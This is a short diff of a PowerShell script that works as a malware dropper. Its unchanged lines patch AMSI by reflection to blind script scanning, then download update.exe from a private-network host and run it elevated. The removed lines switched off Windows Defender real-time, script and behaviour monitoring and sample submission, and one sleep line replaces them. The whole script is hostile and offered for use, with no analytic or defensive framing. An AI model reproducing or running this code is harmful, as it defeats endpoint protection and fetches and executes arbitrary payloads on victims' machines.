@@ -1,11 +1,5 @@
 $a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableScriptScanning $true
-Set-MpPreference -DisableBehaviorMonitoring $true
-Set-MpPreference -DisableBlockAtFirstSeen $true
-Set-MpPreference -MAPSReporting Disabled
-Set-MpPreference -SubmitSamplesConsent NeverSend
+Start-Sleep -Seconds 1
 cmd /c curl -s http://192.168.11.138:8080/update.exe -o %TEMP%\update.exe
 Start-Sleep -Seconds 2
 Start-Process "$env:TEMP\update.exe" -Verb RunAs
